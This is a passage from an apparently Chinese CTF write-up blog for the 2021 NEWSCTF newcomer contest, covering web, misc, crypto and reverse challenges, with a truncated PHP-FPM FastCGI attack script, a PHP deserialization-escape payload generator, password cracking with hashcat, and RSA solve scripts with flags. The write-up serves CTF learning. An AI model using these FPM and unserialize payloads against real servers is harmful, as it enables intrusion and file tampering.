class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;120.78.22.12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;120.78.22.12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接打就好了。</p>
<p>打 tcp 模式或者 unix套接字模式都可以。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622519136613-6be90ae6-1636-4f8c-8e52-21b744b2ddc0.png" alt="image.png"></p>
<p>至于前面那个hint , 可以 url 编码绕，挺奇怪的，我也是抱着试一下心理，用url编码绕，结果就出phpinfo() 了，很奇怪。</p>
<p>还有注意的点就是，不要url编码后再base64 ，我就卡在这一步一直出不来，直接将fpm流base64 编码，本来想打rce的，没成功，可能是出题人设置的吧。</p>
<h3 id="weblogin"><a href="#weblogin" class="headerlink" title="weblogin"></a>weblogin</h3><p>在本地搭了试了一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$datafile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;datafile = <span class="string">&#x27;flag4292787810c14bed46572020d61a77ed&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;act = <span class="string">&#x27;register&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&quot;;&quot;</span>.serialize(<span class="keyword">new</span> Action).<span class="string">&#x27;&#125;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="string">&#x27;O:6:&quot;Action&quot;:5:&#123;s:4:&quot;data&quot;;a:1:&#123;s:17:&quot;jiang0123&quot;;s:253:&quot;;O:6:&quot;Action&quot;:5:&#123;s:4:&quot;data&quot;;s:0:&quot;&quot;;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:40:&quot;flag4292787810c14bed46572020d61a77ed/123&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;&#125;&#125;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;&#125;&quot;;&#125;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;&#125;&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>把序列化后的东西可见字符编码再写入data文件，编码那里出了问题，可能造成逃逸。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622519494037-0c0dac3c-8d1b-497d-85cf-1a12eeb9a24e.png" alt="image.png"></p>
<p>如果是 =xx 就不加密了，挺无聊的。</p>
<h3 id="shorturl"><a href="#shorturl" class="headerlink" title="shorturl"></a>shorturl</h3><p>感觉应该是非预期了</p>
<p>可以任意文件写入的，如果可以admin 删除 url  <em>request</em> 然后让这些文件数量不大于1 就行。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622621954706-67a00236-bb84-42e4-a652-9c671928f939.png" alt="image.png"></p>
<p>变量覆盖导致我们可以越权成为 admin  删除文件。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622621991796-1524ee31-8614-4bfd-8355-004b83dbbfe9.png" alt="image.png"></p>
<p>这里存在反序列化漏洞，而且我们可以注入 |  来打破分隔。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622622073040-f38cb449-3c3a-40bb-9ac8-978c25b5836c.png" alt="image.png"></p>
<p>在文件删除的地方可以调用，写入的时候也有调用</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1622621837382-af943cbe-11de-4d44-9886-3a48b2436d35.png" alt="image.png"></p>
<p>发一发包就好了。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2021-6-1萌新赛-very-ez-dump"><a href="#2021-6-1萌新赛-very-ez-dump" class="headerlink" title="2021.6.1萌新赛-very-ez-dump"></a>2021.6.1萌新赛-very-ez-dump</h3><p>扔进取证大师  拿到加密压缩包，hint提示需要找user密码。</p>
<p>用volatility hashdump发现是空密码。</p>
<p>无语子。</p>
<p>pslist发现有cmd进程</p>
<p>volatility -f ??? –profile = ???   consoles</p>
<p>找到了密码。</p>
<p>解压拿到flag。</p>
<h3 id="2021-6-1萌新赛-sign-in"><a href="#2021-6-1萌新赛-sign-in" class="headerlink" title="2021.6.1萌新赛-sign in"></a>2021.6.1萌新赛-sign in</h3><p>pdf加密了。</p>
<p>先用pdf2john.pl 拿到hash值然后用hashcat爆破就好了，一秒出。</p>
<h3 id="流量题。"><a href="#流量题。" class="headerlink" title="流量题。"></a>流量题。</h3><p>zip文件，打开后流量题。</p>
<p>搜索字符串galf找到对应的流后，提取hex编码并进行取反，脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">txt=&quot;????&quot;</span><br><span class="line"></span><br><span class="line">length = len(txt)</span><br><span class="line">for i in range(len(txt),0,-2):</span><br><span class="line">    # print(txt[length-i:length-i-2])</span><br><span class="line">    print(txt[i-2:i],end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>保存到1.rar文件，有密码和hint。</p>
<p>然后用流量包的密码来解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r flag1.pcapng  -T fields -e urlencoded-form.value | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210601165144525.png" alt="image-20210601165144525"></p>
<p>用密码一个一个试就出了。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTQ1NjcwNTg1MjMwNGU2MTRkN2E0ZTUwNTQ2YzU2NTg1NDdhNGU1NDRlMzAzNTQ3NTc0NTU5MzI0ZTQ2NTI0YjU0NTQ1NjU2NTM0NTZiMzM1MzU0MzAzZA%3D%3D</span><br></pre></td></tr></table></figure>

<p>后面多了两个url编码的东西，去掉拿去自动解密，套了几个base而已</p>
<h3 id="字符串与字节（未做出抄官方WP的）"><a href="#字符串与字节（未做出抄官方WP的）" class="headerlink" title="字符串与字节（未做出抄官方WP的）"></a>字符串与字节（未做出抄官方WP的）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">010101100100010101110101010001010100010001000101010101100100011001010110011001000100010001000110011001100110010001100100010101100100010001010101010101010101010101000110</span><br><span class="line"> <span class="number">101010101001101111011001101101011011011101000100100100110110010010010101001101101010011101000011010101010101010000110111100001000101101010000110101010011000101001001111</span></span><br></pre></td></tr></table></figure>

<p>第一段可以直接转字节，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VEuEDEVFVdDFfddVDUUUF</span><br></pre></td></tr></table></figure>

<p>费解</p>
<p>看了官方的WP，这也太费解了吧，奇数偶数位</p>
<img alt="20210601 NEWSCTF（萌新赛）-2c9d444a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-2c9d444a.png" width="" height="" >

<h3 id="rsa256"><a href="#rsa256" class="headerlink" title="rsa256"></a>rsa256</h3><p>这个文件的日期我很好奇</p>
<img alt="20210601 NEWSCTF（萌新赛）-3acfd61c.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-3acfd61c.png" width="" height="" >

<p>基础的二进制文件读取和rsa公钥提取，主要考验rsa库函数的一些运用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3b6d3806-4b2b-11e7-95a0-000c29d7e93d&#125;</span><br></pre></td></tr></table></figure>

<p>贴一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">n = <span class="number">98432079271513130981267919056149161631892822707167177858831841699521774310891</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">302825536744096741518546212761194311477</span></span><br><span class="line">p = <span class="number">325045504186436346209877301320131277983</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(e, phi))</span><br><span class="line"></span><br><span class="line">pri_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/RSA256/encrypted.message1&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(fp.read(), pri_key).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/RSA256/encrypted.message2&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(fp.read(), pri_key).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/RSA256/encrypted.message3&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(fp.read(), pri_key).decode())</span><br></pre></td></tr></table></figure>

<h3 id="big-exponent"><a href="#big-exponent" class="headerlink" title="big exponent"></a>big exponent</h3><p>好耶，striving师傅出的题目</p>
<p>好……好不起来？</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment">#from py import flag</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    p,q=getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">    n,lcm=p*q,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">    e1 = invert(getPrime(<span class="number">730</span>), lcm)</span><br><span class="line">    e2 = invert(getPrime(<span class="number">730</span>), lcm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (e1,e2,n),(p,q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_e1</span>(<span class="params">e1</span>):</span></span><br><span class="line">    ep=getPrime(<span class="number">2040</span>)</span><br><span class="line">    n=e1*ep</span><br><span class="line">    <span class="keyword">assert</span> e1&gt;ep</span><br><span class="line">    phi=(ep-<span class="number">1</span>)*(e1-<span class="number">1</span>)</span><br><span class="line">    d=nextprime(<span class="built_in">int</span>(iroot(n,<span class="number">4</span>)[<span class="number">0</span>])*<span class="built_in">int</span>(iroot(n,<span class="number">200</span>)[<span class="number">0</span>]))</span><br><span class="line">    e=invert(d,phi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (e,n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_e2</span>(<span class="params">e2</span>):</span></span><br><span class="line">    eq=getPrime(<span class="number">2040</span>)</span><br><span class="line">    <span class="keyword">assert</span> e2&lt;eq</span><br><span class="line">    n=e2*eq</span><br><span class="line">    phi=(eq-<span class="number">1</span>)*(e2-<span class="number">1</span>)</span><br><span class="line">    d=nextprime(<span class="built_in">int</span>(iroot(n,<span class="number">4</span>)[<span class="number">0</span>]/<span class="number">3</span>)-getrandbits(<span class="number">30</span>))</span><br><span class="line">    e=invert(d,phi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (e,n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">flag,e,n</span>):</span></span><br><span class="line">    m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(m,e,n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_key</span>(<span class="params">file_name,e,n</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(file_name,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    E=<span class="number">65537</span></span><br><span class="line">    pubkey,prikey=gen_key()</span><br><span class="line">    e1,e2,n=pubkey</span><br><span class="line">    E1,N1=encrypt_e1(e1)</span><br><span class="line">    export_key(<span class="string">r&quot;pubkey1.pem&quot;</span>,E1,N1)</span><br><span class="line">    E2,N2=encrypt_e2(e2)</span><br><span class="line">    export_key(<span class="string">r&quot;pubkey2.pem&quot;</span>,E2,N2)</span><br><span class="line">    export_key(<span class="string">r&quot;pubkey3.pem&quot;</span>,E,n)</span><br><span class="line"></span><br><span class="line">    cipher=encrypt(flag,E,n)</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">r&quot;flaggg.enc&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    f.write(cipher)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h4 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h4><p>题目不长，思路比较清楚</p>
<img alt="20210601 NEWSCTF（萌新赛）-29cee5ae.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-29cee5ae.png" width="" height="" >

<p>e2那一步可以用boneh_durfee求出d来，但是后面思路断了，看着像d泄漏，但是e也太大了</p>
<p>然后结果n可以分解出来</p>
<p>好家伙，看来只是水题</p>
<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>上家伙</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">101762447604961968347497011921099322367324119881977823223715806843654916018223203152717441386396615480134613864942068489600487206751473112264495957512819776729786840027245275219664091321087832913341367749452671938119115622233015167030327196487127307195872792552039408988207189866115101567965404039921455793363</span></span><br><span class="line">q = <span class="number">146645055489569596158773422326511843870914610026045288623162173369449741025994927278359852181645222010216728295790096211969513458244344811852179454305768973973420398459241985170762812039623053792853389316411927678494740679905048052776274447299638217155556426312374908963757267001415016478005573936685580868907</span></span><br><span class="line"><span class="keyword">assert</span> n == p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(E, phi))</span><br><span class="line">pri_key = rsa.PrivateKey(n, E, d, p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/big_exponent/flaggg.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(fp.read())</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;k\xa3\xe0.[\t\x95\x8b\x08)b\xc0\x11\xd7\xee\xc8\x96\xfca\xa3@ \xe2\xd3\xab%P\xcc\xa7\x00\x94&gt;\xd7\xfc3\x0b\xa1\x85\xba]H|u\xdd\x0e\&#x27;\x96\xc4\xe2s\xbc\xf4\xd2\x94\xd7\xc9\x19|\xcf\xf7\xfa\xe3\x81\x98\xcd\xaa\x19\r\xdd\xc4|\x9d\xa4\xc4\x18\xda\xfeq\xa4\xf23\xef\xbf6\xfb\xa2&lt;\x8a1\xd0\xc9\xac\x8f&gt;D\xafa\x94&quot;NOZ\xff\xf1\xd8\x93&gt;\xea8\xd92\x94]\x07\xa5\xb3vl&gt;\xa1e\xf2\xcbR\xddXs\xbfG\xb5\xe9o\xce\x85]\x1b\xd2\xa9n\x9b\xa3\xa2\xc7\xa4\x0b\xca\xf1\xe76sT\xe2\x1bM\x1e\xaf\x17)\xda\x9f\x9454\x0c\xba\x17\xecY\xb2RUH\rLL\x8eE(dLx\x0b/\xc2M\xb5\xd2\\&#123;E\xff\x0f\xec\x0fMcE\xa1Me\x0c\xae\xfa!,\xb8\x87\xec\x7f?\xd8\xcc\xbc\xbb\xab\x0e\x0bp\x91\xac\x8b\xeb\x11\n%P\xe6\xd5\xbfQ\xdbh\xdbBi\xff2\xdeq\xbdS\xb9\x07\xf1jE/8+\x1dY\x80\x1f\xcdp\xfd&#x27;</span></span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;welcome_to_2th_compettion_2021&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re-signin"><a href="#re-signin" class="headerlink" title="re_signin"></a>re_signin</h3><p>主要的问题是pyc文件没有反编译成功</p>
<img alt="20210601 NEWSCTF（萌新赛）-0d2d4d1c.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-0d2d4d1c.png" width="" height="" >

<p>然后尝试百度之后，这道题最后的解法是</p>
<p>查看内码，试图反编译pyc，结果看到内码发现，不对啊，就是那么短，应该是文件的问题了</p>
<img alt="20210601 NEWSCTF（萌新赛）-80bbc7bd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-80bbc7bd.png" width="" height="" >

<p>好在第二天题目上了hint，直接求冒泡排序的次数，小手动一动，flag天上来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = [[<span class="number">73</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">20</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">99</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">9</span>, <span class="number">91</span>, <span class="number">42</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">8</span>, <span class="number">77</span>, <span class="number">55</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">93</span>],[<span class="number">85</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">58</span>, <span class="number">35</span>, <span class="number">83</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">18</span>, <span class="number">52</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">51</span>, <span class="number">84</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">88</span>, <span class="number">87</span>],[<span class="number">97</span>, <span class="number">34</span>, <span class="number">31</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">4</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">63</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">72</span>, <span class="number">21</span>, <span class="number">36</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">79</span>],[<span class="number">31</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">30</span>, <span class="number">47</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">74</span>, <span class="number">88</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">50</span>, <span class="number">83</span>],[<span class="number">88</span>, <span class="number">5</span>, <span class="number">85</span>, <span class="number">82</span>, <span class="number">36</span>, <span class="number">74</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">40</span>, <span class="number">55</span>, <span class="number">95</span>, <span class="number">8</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">96</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">26</span>, <span class="number">39</span>],[<span class="number">54</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">66</span>, <span class="number">91</span>, <span class="number">39</span>, <span class="number">38</span>, <span class="number">57</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">28</span>, <span class="number">49</span>, <span class="number">92</span>, <span class="number">29</span>, <span class="number">85</span>, <span class="number">88</span>, <span class="number">84</span>, <span class="number">90</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">52</span>],[<span class="number">80</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">10</span>, <span class="number">52</span>, <span class="number">11</span>, <span class="number">99</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">60</span>, <span class="number">48</span>, <span class="number">36</span>, <span class="number">74</span>, <span class="number">55</span>, <span class="number">51</span>, <span class="number">86</span>, <span class="number">49</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">82</span>, <span class="number">16</span>],[<span class="number">35</span>, <span class="number">70</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">65</span>, <span class="number">84</span>, <span class="number">71</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">86</span>, <span class="number">20</span>, <span class="number">54</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">77</span>],[<span class="number">71</span>, <span class="number">25</span>, <span class="number">43</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">30</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">47</span>, <span class="number">13</span>, <span class="number">76</span>, <span class="number">8</span>, <span class="number">83</span>, <span class="number">87</span>, <span class="number">57</span>, <span class="number">26</span>, <span class="number">16</span>, <span class="number">19</span>],[<span class="number">29</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">94</span>, <span class="number">32</span>, <span class="number">57</span>, <span class="number">1</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">92</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">80</span>, <span class="number">98</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">33</span>],[<span class="number">67</span>, <span class="number">14</span>, <span class="number">93</span>, <span class="number">91</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">38</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">27</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">66</span>, <span class="number">24</span>, <span class="number">99</span>, <span class="number">43</span>],[<span class="number">29</span>, <span class="number">56</span>, <span class="number">44</span>, <span class="number">54</span>, <span class="number">70</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">85</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">21</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">48</span>, <span class="number">90</span>, <span class="number">84</span>],[<span class="number">23</span>, <span class="number">33</span>, <span class="number">90</span>, <span class="number">7</span>, <span class="number">42</span>, <span class="number">71</span>, <span class="number">25</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">47</span>, <span class="number">54</span>, <span class="number">18</span>, <span class="number">97</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">85</span>, <span class="number">69</span>, <span class="number">49</span>],[<span class="number">77</span>, <span class="number">67</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">35</span>, <span class="number">6</span>, <span class="number">56</span>, <span class="number">94</span>, <span class="number">81</span>, <span class="number">23</span>, <span class="number">78</span>, <span class="number">50</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">69</span>, <span class="number">43</span>, <span class="number">91</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">99</span>, <span class="number">38</span>],[<span class="number">20</span>, <span class="number">47</span>, <span class="number">52</span>, <span class="number">27</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">9</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">2</span>, <span class="number">97</span>, <span class="number">44</span>, <span class="number">35</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">29</span>, <span class="number">58</span>, <span class="number">56</span>, <span class="number">74</span>, <span class="number">84</span>],[<span class="number">66</span>, <span class="number">11</span>, <span class="number">76</span>, <span class="number">91</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">75</span>, <span class="number">32</span>, <span class="number">71</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">88</span>, <span class="number">20</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">63</span>, <span class="number">47</span>, <span class="number">78</span>, <span class="number">60</span>, <span class="number">81</span>],[<span class="number">43</span>, <span class="number">13</span>, <span class="number">70</span>, <span 